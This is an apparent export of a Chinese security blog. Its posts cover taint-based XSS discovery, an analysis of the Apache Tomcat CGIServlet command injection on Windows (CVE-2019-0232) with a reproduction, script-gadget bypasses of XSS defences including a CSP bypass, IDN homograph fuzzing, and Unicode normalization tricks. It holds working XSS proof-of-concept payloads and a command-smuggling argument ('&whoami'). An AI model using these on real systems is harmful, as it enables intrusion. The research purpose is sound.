{"meta":{"title":"Lyle's Blog","subtitle":null,"description":null,"author":"Lyle","url":"https://LyleMi.github.io"},"pages":[],"posts":[{"title":"基于污点分析的XSS漏洞辅助挖掘的一种方式","slug":"xss-auto","date":"2019-06-12T02:37:07.000Z","updated":"2019-06-12T08:56:24.754Z","comments":true,"path":"2019/06/12/xss-auto/","link":"","permalink":"https://LyleMi.github.io/2019/06/12/xss-auto/","excerpt":"序我在之前的一篇文章中简单讲解了Web应用代码自动化审计的几种实现方式。 这篇文章以自动化辅助挖掘XSS漏洞漏洞为例，简单的讲解一个实际的灰盒分析实现的例子。","text":"序我在之前的一篇文章中简单讲解了Web应用代码自动化审计的几种实现方式。 这篇文章以自动化辅助挖掘XSS漏洞漏洞为例，简单的讲解一个实际的灰盒分析实现的例子。 在上文中有提到到，漏洞可以认为是输入到危险函数的过程，所以这篇文章涉及到的主要是输入、危险函数、具体实现这三个部分。 输入作为污点来源的输入主要考虑当前状态、网络请求和存储函数三个来源。 当前状态主要指像窗口名、当前Url、Hash、referr等，具体对应如下这些变量： window.name window.location.href window.location.search window.location.hash window.location.pathname window.location.url document.URL document.documentURI document.URLUnencoded document.baseURI document.referrer 网络请求主要指使用异步方式获取的请求及其响应，这部分可以通过hook XMLHttpRequest fetch 等API来获取。 存储主要指Cookie、Indexdb、localStorage、sessionStorage等。 部分输入在网页初始化时已经确定，这部分由程序记录下来。部分输入会不断变化，如cookie等，这部分输入会通过插桩、事件处理等方式进行监控，并实时对变化进行记录。 危险函数这里把危险函数分为直接执行JavaScript、加载URL、执行HTML、创建元素、部分可控执行五类，具体涉及到的函数与相关模式如下。 直接执行JavaScript这类危险函数直接把输入以JavaScript代码的形式执行，例如。 eval(payload) setTimeout(payload, 100) setInterval(payload, 100) Function(payload)() &lt;script&gt;payload&lt;/script&gt; &lt;img src=x onerror=payload&gt; 加载URL这类危险函数以URL加载的形式执行JavaScript代码，但是大体和JavaScript类似。 location=javascript:alert(/xss/) location.href=javascript:alert(/xss/) location.assign(javascript:alert(/xss/)) location.replace(javascript:alert(/xss/)) 执行HTML这类危险函数直接把输入以HTML代码的形式执行，在一定情况下可以执行代码。 xx.innerHTML=payload xx.outerHTML=payload document.write(payload) document.writeln(payload) 创建元素这类调用大多是创建一个DOM元素，并将其加入页面中。当script的源可控或者元素的构造可控的时候，可能会出现问题。 scriptElement.src domElement.appendChild domElement.insertBefore domElement.replaceChild 部分可控执行这类调用存在一定的动态成分，可控的程度不高，但是在部分情况下存在价值，因此在工具中加入了对其的监控。 (new Array()).reduce(func) (new Array()).reduceRight(func) (new Array()).map(func) (new Array()).filter(func) 整体架构污点追踪污点追踪的实现有两种思路，一种思路是hook浏览器native的实现，但是这种方法要求对浏览器本身的实现机制有比较好的了解，而且编译过程复杂，很难迁移。浏览器一旦更新，就需要修改大量的代码来适应。 另外一种思路是基于浏览器插件做JavaScript层的Hook，这种方式虽然没有浏览器源代码层的hook底层，但是开发更快，更容易迁移，在有新的机制出现时也比较容易适应。 Chrome插件中，代码分在content-script、background、popup等运行时中。其中只有content-script可以操纵宿主页面的DOM，但是宿主页面JavaScript和content-script也在不同的沙箱中，无法hook，只能使用注入的方式。 在hook后，当出现危险函数的调用或网络请求时，则将其记录至后台。 疑似利用确认和很多漏洞不同，大部分存储型的漏洞是没有回显的，因此需要做一定的确认工作。 在获取信息后，以域名为单位。遍历sink和source，查找重合的地方。如果source在sink的参数中出现，就可能是漏洞点。需要注意的是，除了hash之外，网络请求等各种参数不一定可控。另外，需要去除同一域名下，同一参数同一调用的Sink，同一源和同一返回的结果，减少重复数据。 在具体确认的时候，考虑到，sink中的参数可能是source的一部分，source中也可能只是sink的一部分，因此使用公共子字符串算法，只要字串的长度小于sink和source最小的长度。 不过即使完全可控，也可能出现waf、sanitizer、难以绕过的csp策略等。因此这种方法会有比较高的误报率，但是相对的，在hook较全的情况下，漏报率会小很多。 除了上面提到的这种方式，工具还采取了动态污染的方式。通过修改请求参数和修改函数调用时的参数两种方式，传入一些测试性的payload，如果在返回界面获取到了相信的结果，那么漏洞就是存在的。 结果查看这里考虑过直接用插件自带的界面popup / background来显示可能的结果，用浏览器层的localstorge存储数据，但是考虑这种方式会影响浏览器间迁移的兼容性。 于是最后单独用vuejs + django编写了一个小的站点来接收请求，查看结果。 参考链接 基于chrome扩展的脚本注入工具 让前端监控数据采集更高效","categories":[],"tags":[{"name":"XSS 自动化","slug":"XSS-自动化","permalink":"https://LyleMi.github.io/tags/XSS-自动化/"}]},{"title":"CVE-2019-0232：Apache Tomcat RCE漏洞分析","slug":"cve-2019-0232","date":"2019-04-20T04:43:30.000Z","updated":"2019-04-26T03:47:45.116Z","comments":true,"path":"2019/04/20/cve-2019-0232/","link":"","permalink":"https://LyleMi.github.io/2019/04/20/cve-2019-0232/","excerpt":"简述利用前提该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。 该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。","text":"简述利用前提该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。 该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。 时间线 报告漏洞 2019-3-3 漏洞公开 2019-4-10 漏洞影响范围 Apache Tomcat 9.0.0.M1 to 9.0.17 Apache Tomcat 8.5.0 to 8.5.39 Apache Tomcat 7.0.0 to 7.0.93 复现笔者使用的复现环境为9.0.12 + JRE 1.8.0。 首先进行CGI相关的配置，在 conf/web.xml 中启用CGIServlet： 1234567891011121314151617&lt;servlet&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;executable&lt;/param-name&gt; &lt;param-value&gt;&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;&lt;/servlet&gt; 这里主要的设置是 enableCmdLineArguments 和 executable 两个选项。 enableCmdLineArguments 启用后才会将Url中的参数传递到命令行， executable 指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。 同样在 conf/web.xml 中启用cgi的servlet-mapping 1234&lt;servlet-mapping&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 之后修改 conf/context.xml 的 &lt;Context&gt; 添加 privileged=&quot;true&quot;属性，否则会没有权限 12345678910111213&lt;Context privileged=\"true\"&gt; &lt;!-- Default set of monitored resources. If one of these changes, the --&gt; &lt;!-- web application will be reloaded. --&gt; &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt; &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt; &lt;WatchedResource&gt;$&#123;catalina.base&#125;/conf/web.xml&lt;/WatchedResource&gt; &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt; &lt;!-- &lt;Manager pathname=\"\" /&gt; --&gt;&lt;/Context&gt; 然后在 ROOT\\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 e.bat 文件。 配置完成后，启动tomcat，访问 http://127.0.0.1:8080/cgi-bin/e.bat?&amp;ver ，可以看到命令执行成功。 原理漏洞相关的代码在 tomcat\\java\\org\\apache\\catalina\\servlets\\CGIServlet.java 中，CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。 这个漏洞是因为 Runtime.getRuntime().exec 在Windows中和Linux中底层实现不同导致的。下面以一个简单的case来说明这个问题，在Windows下创建arg.bat： 12rem arg.batecho %* 并执行如下的Java代码 12String [] cmd=&#123;\"arg.bat\", \"arg\", \"&amp;\", \"dir\"&#125;;Runtime.getRuntime().exec(cmd); 在Windows下会输出 arg 和 dir 命令运行后的结果。同样的，用类似的脚本在Linux环境下测试： 12345# arg.shfor key in \"$@\"do echo '$@' $keydone 12String [] cmd=&#123;\"arg.sh\", \"arg\", \"&amp;\", \"dir\"&#125;;Runtime.getRuntime().exec(cmd); 此时的输出为 123$@ arg$@ &amp;$@ dir 导致这种输出的原因是在JDK的实现中 Runtime.getRuntime().exec 实际调用了 ProcessBuilder ，而后 ProcessBuilder 调用 ProcessImpl使用系统调用 vfork ，把所有参数直接传递至 execve。 用 strace -F -e vfork,execve java Main 跟踪可以看到上面的Java代码在Linux中调用为 1execve(&quot;arg.sh&quot;, [&quot;arg.sh&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;], [/* 23 vars */]) 而如果跟踪类似的PHP代码 system(&#39;arg.sh arg &amp; dir&#39;); ，得到的结果为 1execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;arg.sh arg &amp; dir&quot;], [/* 23 vars */]) 所以Java的 Runtime.getRuntime().exec 在CGI调用这种情况下很难有命令注入。 Windows中创建进程使用的是 CreateProcess ，会将参数合并成字符串，作为 lpComandLine 传入 CreateProcess 。程序启动后调用 GetCommandLine 获取参数，并调用 CommandLineToArgvW 传至 argv。在Windows中，当 CreateProcess 中的参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe , 故最后会变成 cmd.exe /c &quot;arg.bat &amp; dir&quot;，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。 除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过， 例如 dir &quot;\\&quot;&amp;whoami&quot; 在Linux中是安全的，而在Windows会执行命令。 这是因为Windows在处理命令行参数时，会将 &quot; 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 &quot; ，但是对 \\&quot; 的处理有误。同样用 arg.bat 做测试，可以发现这里只输出了 \\ 。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。 修复方式开发者在 patch 中增加了 cmdLineArgumentsDecoded 参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。 校验写在 setupFromRequest 函数中： 123456789String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);if (cmdLineArgumentsDecodedPattern != null &amp;&amp; !cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) &#123; if (log.isDebugEnabled()) &#123; log.debug(sm.getString(\"cgiServlet.invalidArgumentDecoded\", decodedArgument, cmdLineArgumentsDecodedPattern.toString())); &#125; return false;&#125; 不通过时，会将 CGIEnvironment 的 valid 参数设为 false ，在之后的处理函数中会直接跳过执行。 1234567891011121314if (cgiEnv.isValid()) &#123; CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(), cgiEnv.getEnvironment(), cgiEnv.getWorkingDirectory(), cgiEnv.getParameters()); if (\"POST\".equals(req.getMethod())) &#123; cgi.setInput(req.getInputStream()); &#125; cgi.setResponse(res); cgi.run();&#125; else &#123; res.sendError(404);&#125; 修复建议 使用更新版本的Apache Tomcat。这里需要注意的是，虽然在9.0.18就修复了这个漏洞，但这个更新是并没有通过候选版本的投票，所以虽然9.0.18没有在被影响的列表中，用户仍需要下载9.0.19的版本来获得没有该漏洞的版本。 关闭enableCmdLineArguments参数 参考链接 https://tomcat.apache.org/security-9.html https://tomcat.apache.org/tomcat-9.0-doc/cgi-howto.html https://github.com/apache/tomcat/commit/4b244d8 https://github.com/pyn3rd/CVE-2019-0232/ https://tools.ietf.org/html/rfc3875 https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/ https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat","categories":[],"tags":[]},{"title":"Web应用代码自动化审计浅谈","slug":"Web-Application-Auto-Audit","date":"2019-04-06T10:17:22.000Z","updated":"2019-04-06T10:18:10.735Z","comments":true,"path":"2019/04/06/Web-Application-Auto-Audit/","link":"","permalink":"https://LyleMi.github.io/2019/04/06/Web-Application-Auto-Audit/","excerpt":"0. 序代码审计是找到应用缺陷的过程。自动化审计通常有白盒、黑盒、灰盒等多种方式。白盒指通过对源代码的分析找到应用缺陷；黑盒通常不涉及到源代码，多使用模糊测试等方式来找到漏洞；而灰盒则是黑白结合的方式，利用黑盒特性来减少白盒的计算复杂度，使用白盒的信息来衡量漏洞的有效性。","text":"0. 序代码审计是找到应用缺陷的过程。自动化审计通常有白盒、黑盒、灰盒等多种方式。白盒指通过对源代码的分析找到应用缺陷；黑盒通常不涉及到源代码，多使用模糊测试等方式来找到漏洞；而灰盒则是黑白结合的方式，利用黑盒特性来减少白盒的计算复杂度，使用白盒的信息来衡量漏洞的有效性。 1. 基础概念1.1 输入 (Source)Web应用的输入，可以是请求的参数（GET、POST等）、上传的文件、Cookie、数据库数据等用户可控或者间接可控的地方。 例如PHP中的 $_GET / $_POST / $_REQUEST / $_COOKIE / $_FILES / $_SERVER 等，都可以作为应用的输入。 1.2 处理函数 (Filter)处理函数是对数据进行过滤或者编解码的函数。这些函数会对输入造成影响，为漏洞利用带来不确定性。 同样以PHP为例，这样的函数可能是 mysqli_real_escape_string / htmlspecialchars / base64_encode / str_rot13 等，也可能是应用自定义的过滤函数。 1.3 危险函数 (Sink)危险函数又常叫做Sink Call、漏洞点，是可能触发危险行为如文件操作、命令执行、数据库操作等行为的函数。 在PHP中，可能是 include / system / echo 等。 1.4 问题定义一般认为一个漏洞的触发过程是从输入经过过滤到危险函数的过程(Source To Sink)，而自动化审计就是寻找这个链条的过程。自动化审计的难点主要在于以下几个方面。 1.4.1 输入多样化对Web应用来说，可能的输入可以来自GET/POST的参数、Cookie、Url等多个地方，这些输入格式不固定，输入空间很大。 1.4.2 过滤函数复杂在审计的过程中，从输入没有经过任何过滤函数就到达危险函数的过程较少。但是自动化判断一些过滤数是否可以绕过较为困难。 1.4.3 代码本身的复杂度现代Web框架，代码复杂度极高，有相当多的动态加载和调用的过程，为自动化分析带来了困难。 2. 技术基础2.1 抽象语法树抽象语法树，顾名思义，是一种树形的数据结构。构造AST树的基本方法是将表达式的操作数作为树结构的叶子，将表达式的操作符号作为树结构的根，依次循环迭代进行构造。 例如在JavaScript中， a=1 的抽象语法树如下： 123456789101112131415161718192021222324&#123; \"type\": \"Program\", \"body\": [ &#123; \"type\": \"ExpressionStatement\", \"expression\": &#123; \"type\": \"AssignmentExpression\", \"operator\": \"=\", \"left\": &#123; \"type\": \"Identifier\", \"name\": \"a\" &#125;, \"right\": &#123; \"type\": \"Literal\", \"value\": 1, \"raw\": \"1\" &#125; &#125; &#125;], \"sourceType\": \"script\"&#125; 2.2 程序控制流图AST树依旧是比较高层次的形式，其中模块之间的调用、循环等依旧不利于数据流的处理，因此引入了更底层的程序控制流图来进行分析。 程序控制流图(Control Flow Graph，CFG)是静态分析过程中的另一种状态，可以反映程序代码控制流程。其实，程序控制流图是由一个入口、若干个出口组成的有向图，图中的每一个节点代表一个基本块，基本块中可以有一系列顺序执行的语句；图中的有向边，代表从出发节点到目标节点的控制依赖关系。 3. 解决方案3.1 危险函数匹配白盒审计最常见的方式是通过查找危险函数来定位漏洞，比较有代表性的工具是Seay开发的审计工具。这个工具直接找出所有危险函数的位置，这种方式没有对调用流程进行深入分析，相对误报率会比较高。 不过同样的，这种方式在一些环境下能做到几乎无漏报，只要审计者有耐心，可以发现应用大部分的漏洞，但是在高度框架化的代码中，这种方式能找到的漏洞相对有限。 3.2 代码相似性比对一些开发者会复制其他框架的代码，或者使用各种框架。如果事先有建立对应的漏洞图谱，则可使用相似性方法来找到漏洞。 3.3 控制流分析在2012年，Dahse J等人设计了RIPS，该工具引入AST进行数据流与控制流分析，结合过程内与过程间的分析得到审计结果，相对危险函数匹配的方式来说误报率少了很多，但是同样的也增加了开销。RIPS初始的版本开放源代码，而后闭源进行商业化。 3.4 基于图的分析基于图的分析是对控制流分析的一个改进，其利用CFG的特性和图计算的算法，一定程度上简化了计算，比较有代表性的是微软的Semmle QL和NDSS 2017年发表的文章Efficient and Flexible Discovery of PHP Application Vulnerabilities。 3.5 灰盒分析基于控制流的分析开销较大，于是有人提出了基于运行时的分析方式，对代码进行Hook，当执行到危险函数时自动回溯输入，找到输入并判断是否可用。 这种方式解决了控制流分析实现复杂、计算路径开销大的问题，在判断过滤函数上也有一定的突破，但是灰盒的方式并不一定会触发所有的漏洞。fate0师傅开发的prvd就是基于这种设计思路。 4. 参考资料 [1] RIPS https://github.com/ripsscanner/rips [2] prvd https://github.com/fate0/prvd [3] PHP运行时漏洞检测 http://blog.fatezero.org/2018/11/11/prvd/ [4] Cobra https://github.com/FeeiCN/cobra [5] Semmle QL https://github.com/Semmle/ql [6] Vulnerability hunting with Semmle QL https://blogs.technet.microsoft.com/srd/2018/08/16/vulnerability-hunting-with-semmle-ql-part-1/ [7] Backes M , Rieck K , Skoruppa M , et al. Efficient and Flexible Discovery of PHP Application Vulnerabilities[C]// IEEE European Symposium on Security &amp; Privacy. IEEE, 2017. [8] Dahse J. RIPS-A static source code analyser for vulnerabilities in PHP scripts[J]. Retrieved: February, 2010, 28: 2012. [9] awesome static analysis https://github.com/mre/awesome-static-analysis 5. 结语在学习自动化审计的过程中做了一点整理，于是形成了这篇文章，水平有限，这篇文章讲得也比较浅。之后有机会再就各个技术的细节做进一步分析，不当之处还请各位师傅不吝指出。","categories":[],"tags":[]},{"title":"基于Gadgets绕过XSS防御机制","slug":"bypass-xss-mitigation-via-gadgets","date":"2019-02-27T01:49:17.000Z","updated":"2019-02-27T01:50:04.720Z","comments":true,"path":"2019/02/27/bypass-xss-mitigation-via-gadgets/","link":"","permalink":"https://LyleMi.github.io/2019/02/27/bypass-xss-mitigation-via-gadgets/","excerpt":"这篇文章是之前对CCS 2018 Code-Reuse Attacks for the Web Breaking Cross-Site Scripting Mitigations via Script Gadgets 的阅读笔记，最近整理资料发现放了挺久，于是稍做了一些整理和扩展发了出来。","text":"这篇文章是之前对CCS 2018 Code-Reuse Attacks for the Web Breaking Cross-Site Scripting Mitigations via Script Gadgets 的阅读笔记，最近整理资料发现放了挺久，于是稍做了一些整理和扩展发了出来。 0x00 背景本文主要考虑在可以注入任意HTML代码（富文本编辑器等应用）的条件下，利用JavaScript库中的一些代码片段（Gadget）来绕过常见的XSS防御机制，包括WAF、浏览器的XSS Filter、HTML Sanitizers、Content Security Policy等。 其中WAF考虑对请求值和返回值进行处理的正则匹配型或者字符匹配型WAF，HTML Sanitizers是则指DOMPurify这种基于DOM解析的XSS过滤器，Content Security Policy则主要考虑启用unsafe-eval或strict-dynamic的情况。 0x01 简单例子和二进制攻击中的Gadget作用类似，本文中的Gadget是指可能被恶意利用的代码片段，下面以一个简单的例子来说明： 12var button = document.getElementById(\"mbutton\");button.innerHTML = button.getAttribute(\"data-text\"); 在这段代码中，取出了Id为mbutton的元素，并将data-text的值赋到了该元素的innerHTML属性。这是一些库中为了实现类似Tooltip等效果常用的一种方式，但是在存在这种代码片段的时候，只要构造如下的元素，就可造成XSS攻击。 1&lt;button id=\"mbutton\" data-text=\"&lt;img src=x onerror=alert(/xss/)&gt;\"&gt;a&lt;/button&gt; 0x02 Gadget分类论文中把可利用的Gadget分为几类，具体如下： 字符串操作这种Gadget主要是指对字符串的操作，一个字符串在经过操作后可能变为造成攻击的字符。 例如Polymer中的一段代码dash.replace(/-[a-z]/g, (m) =&gt; m[1].toUpperCase())，这段代码会把以连字符构成的字符串变为大写，例如像inner-h-t-m-l这种字符串处理后会变成innerHTML。大部分WAF是对请求值和返回值做匹配，而此时传入的是inner-h-t-m-l而不是innerHTML，那么就有可能造成绕过。 元素创建这种Gadget是像document.createElement(input) document.createElement(&quot;script&quot;) jQuery(&quot;&lt;&quot; + tag + &quot;&gt;&quot;) jQuery.html(input) 这种直接创建的标签甚至script的代码片段。当输入一定程度可控时，则可利用这种Gadget。 函数创建这种Gadget是指创建函数的代码段，比如Underscore.js中发现的一段代码： 12345source = \"var __t,__p='',__j=Array.prototype.join,\" +\"print=function()&#123;__p+=__j.call(arguments,'');&#125;;\\n\" +source + 'return __p;\\n';var render = new Function(settings.variable || 'obj', '_', source); 这种Gadget会间接执行构造的代码段，在一定条件下可造成攻击。 JavaScript代码执行这种Gadget主要是指类似eval这种会直接执行传入代码的代码段，例如： 12345eval(input);inputFunction.apply();node.innerHTML = \"prefix\" + input + \"suffix\";scriptElement.src = input;node.appendChild(input); 表达式解析很多前端框架都提供了自己的模版引擎，有着丰富而强大的功能，这种Gadget就是框架中对模版表达式解析执行而造成的问题。例如Aurelia框架中可以用下面这段代码来触发一个代码执行。 123&lt;div ref=mes.bind=&quot;$this.me.ownerDocument.defaultView.alert(1)&quot;&gt;&lt;/div&gt; 0x03 例子例一论文中提及的例子很多，本文选取其中一个在jQuery Mobile中的Gadget来介绍： 1234567if (myId) &#123; ui.screen.attr(\"id\", myId + \"-screen\"); ui.container.attr(\"id\", myId + \"-popup\"); ui.placeholder .attr(\"id\", myId + \"-placeholder\") .html(\"&lt;!-- placeholder for \" + myId + \" --&gt;\");&#125; 这个Gadget会提取data-role为popup的元素，获取其id中的内容，并调用.html，那么就可以构造一个如下的PoC： 123&lt;div data-role=popup id='--&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'&gt;&lt;/div&gt; 在这个PoC中，没有&lt;script&gt;这种会触发WAF的字符串，用到的属性也是data-role id等在HTML Sanitizer白名单中的元素，因此该PoC可以绕过大部分的防御手段。 例二虽然文中主要是针对unsafe-eval或strict-dynamic两种情况作了CSP的绕过，但是在有的情况下，不开启这两个选项也可实现执行，例如下面这个PoC： 1234567891011121314&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=content-security-policy content=\"object-src 'none';script-src https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js;\"&gt; &lt;script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div ng-app ng-csp&gt; &lt;div ng-focus=\"x=$event\" tabindex=0&gt;foo&lt;/div&gt; &lt;div ng-repeat=\"(key, value) in x.view\"&gt; &lt;div ng-if=key==\"window\"&gt;&#123;&#123; value.alert = [1].reduce(value.alert, 'xss') &#125;&#125;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 在模版内部中，Angular利用的是下面这个函数来完成调用，并不涉及eval等函数，因此在CSP没有开启unsafe-eval或strict-dynamic的情况下也可实现代码执行。 123function defaultHandlerWrapper(element, event, handler) &#123; handler.call(element, event);&#125; 0x04 Gadget发现对Gadget的查找，作者给出了两种方式，一种是手工查找，一种是基于污点分析的半自动化查找。手工查找本文不做赘述，主要讲基于污点分析的半自动化查找方式。 这种方式是基于2013年CCS的一篇名为25 Million Flows Later - Large-scale Detection of DOM-based XSS的文章。 该方式基于浏览器完成，先对eval document.write等敏感调用和innerHTML做了污点跟踪。然后爬取Alex Top 5000的网站，当发现数据流入了这些敏感调用，就尝试使用预置的一些攻击载荷尝试利用，若利用成功，则找到了一个Gadget。 当然这种方式也存在一些限制，比如作者只对第一级的链接做了分析和尝试、没有做用户交互和验证、在验证的时候没有考虑防御机制的绕过等。 0x05 参考链接 https://github.com/cure53/DOMPurify https://github.com/google/security-research-pocs/tree/master/script-gadgets https://queue.acm.org/detail.cfm?id=2663760 https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf","categories":[],"tags":[]},{"title":"IDN Spoof漏洞自动化挖掘","slug":"idnfuzz","date":"2018-12-08T01:34:39.000Z","updated":"2018-12-08T01:37:25.984Z","comments":true,"path":"2018/12/08/idnfuzz/","link":"","permalink":"https://LyleMi.github.io/2018/12/08/idnfuzz/","excerpt":"0x00 背景国际化域名国际化域名（Internationalized Domain Name，IDN）又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，包括中文、法语、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编码而成。在域名系统中，国际化域名使用Punycode转写并以ASCII字符串储存。 同形异义攻击同形异义字是利用IDN中一些非拉丁字符语种的字母与拉丁字符非常相似，字面看很难区分的特性，找到对应的字符来实现钓鱼攻击。例如16ვ.com(U+10D5)、16ဒ.com (U+1012)、16ҙ.com (U+0499) 都在一定程度上和163.com有相似性，基于一些开放的https证书服务这些域名还能取得相应的证书，进一步增加钓鱼成功的可能性。","text":"0x00 背景国际化域名国际化域名（Internationalized Domain Name，IDN）又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，包括中文、法语、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编码而成。在域名系统中，国际化域名使用Punycode转写并以ASCII字符串储存。 同形异义攻击同形异义字是利用IDN中一些非拉丁字符语种的字母与拉丁字符非常相似，字面看很难区分的特性，找到对应的字符来实现钓鱼攻击。例如16ვ.com(U+10D5)、16ဒ.com (U+1012)、16ҙ.com (U+0499) 都在一定程度上和163.com有相似性，基于一些开放的https证书服务这些域名还能取得相应的证书，进一步增加钓鱼成功的可能性。 PunycodePunycode是RFC 3492标准设计的编码系统，用于把Unicode转换为可用的DNS系统的编码，比如16ҙ.com就会被转成xn–16-8tc.com，这在一定程度上可以防止IDN欺骗。 0x01 漏洞介绍在主流浏览器中，Chromium Project对这类漏洞关注度较多，甚至特别在安全类型中设置了对应的idn-spoof标签。 在chromium中维护了一个domain list，内置了一些较有知名度的域名，当有域名被认为和这些相似域名相似时，就会转成punycode显示。 其完整的检测算法可以在这里看到，对其详细的解释可以参考这篇文章。 总的来说，只要找到了一个字符的组合，可以通过Spoof Check，且在浏览器地址栏中显示的字形和top domain相似，就可以认为找到了一个IDN Spoof漏洞。 0x02 挖掘方法Unicode的字符较多，因此笔者考虑一定程度上将漏洞挖掘的过程自动化。最直接的思路是，将域名是否同形的问题转换为图像相似度的问题。 我们可以遍历所有的Unicode字符，使用浏览器地址栏渲染的字体生成其对应的图像，当其图像和域名中允许出现的ascii字符相似度较高时，则认为是可能造成Spoof的字符。 在这里笔者使用了感知哈希算法作为图像相似度的计算的方式，其大致步骤如下： 将图像缩小至相同尺寸：用于去除图像的细节，保留结构等基本信息 简化色彩：将缩小后的图像转为64级灰度，减少颜色带来的影响 计算平均值：计算所有像素的灰度平均值 比较像素的灰度：将每个像素的灰度，与平均值进行比较，记录结果 计算Hash值：将上一步的结果组合在一起构成一个整数作为图片的指纹 在获取到Unicode字符图片对应的Hash值后，使用计算汉明距离的方式计算两个图片的距离，就可以得到较为相似的字符列表了。 当找到符合条件的字符后，则找到包含该字符的域名，替换该字符进行测试，检测其是否能通过Spoof Check。这里直接使用Chrome测试不太方便，这里笔者抽取了其中部分代码形成独立的脚本进行测试。 另外对一些特别的字符，如 / / ? / . / # 等，则构造包含对应字符的URL进行测试。 通过图像相似度和Spoof Check的测试后，最后进行人工的确认，如确实是可能造成Spoof的字符，则认为是漏洞并报告。 0x03 挖掘结果经测试，笔者成功找到了 crbug.com/904325 、 crbug.com/904627 等尚未修复的Spoof漏洞。 0x04 参考资料 https://en.wikipedia.org/wiki/Internationalized_domain_name https://www.unicode.org/faq/idn.html https://xlab.tencent.com/en/2018/11/13/cve-2018-4277/ https://en.wikipedia.org/wiki/IDN_homograph_attack https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e https://en.wikipedia.org/wiki/Perceptual_hashing Gontmakher A . The Homograph Attack[J]. Communications of the Acm, 2002, 45(2):128.","categories":[],"tags":[]},{"title":"Unicode等价性浅谈","slug":"unicode-normalization","date":"2018-10-29T08:56:53.000Z","updated":"2018-11-27T01:56:14.951Z","comments":true,"path":"2018/10/29/unicode-normalization/","link":"","permalink":"https://LyleMi.github.io/2018/10/29/unicode-normalization/","excerpt":"做SSRF测试的时候，常提到用类似 ａ 字符来bypass过滤器，之前没有做深究，偶然的一次机会，发现bａidu.com(\\uff41)能跳转到百度，但是bаidu.com(\\u0430)会被认为是一个新的IDN域名，并不指向baidu.com。","text":"做SSRF测试的时候，常提到用类似 ａ 字符来bypass过滤器，之前没有做深究，偶然的一次机会，发现bａidu.com(\\uff41)能跳转到百度，但是bаidu.com(\\u0430)会被认为是一个新的IDN域名，并不指向baidu.com。 先在浏览器中打开工具调试，发现第一个case在HTTP包中的Host字段的值是baidu.com，那么应该是先处理过再发送的请求。 想到了其中可能会有编码转换，简单看了一下IDN的RFC没有找到有价值的信息，于是开始找源码，以idna为关键字在WebKit的源码中找到相关函数 uidna_nameToUnicode ，在Chromium中也找到这个函数。 顺着关键字找到icu标准的实现，其在官方网站上很清楚的给出了转换的demo和浏览器normalize的demo，那么使用其进行测试。 bａidu.com测试结果入下： bаidu.com测试结果入下： 从上面这个结果可以看到\\uff41在某些模式下会被转换，而\\u0430在所有模式下都不会被转换，那么到这里这个问题已经有一个初步的答案了，第一个case被normalize转换为ascii，所以能正常解析。第二个case不会被转换，被做为unicode处理，所以会访问IDN域名。 